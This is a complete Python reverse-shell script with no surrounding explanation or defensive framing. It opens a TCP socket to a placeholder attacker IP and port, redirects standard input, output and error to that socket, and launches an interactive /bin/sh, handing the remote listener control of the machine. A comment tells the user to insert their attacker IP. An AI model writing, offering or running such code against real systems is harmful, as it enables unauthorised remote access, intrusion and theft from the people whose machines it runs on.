import socket
import subprocess
import os

# Replace 'IP_ADDRESS' and '1234' with your attacker's IP and listening port
ATTACKER_IP = 'IP_ADDRESS'
ATTACKER_PORT = 1234

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)  # Redirect standard input
    os.dup2(s.fileno(), 1)  # Redirect standard output
    os.dup2(s.fileno(), 2)  # Redirect standard error
    subprocess.call(['/bin/sh', '-i'])

if __name__ == '__main__':
    reverse_shell(ATTACKER_IP, ATTACKER_PORT)
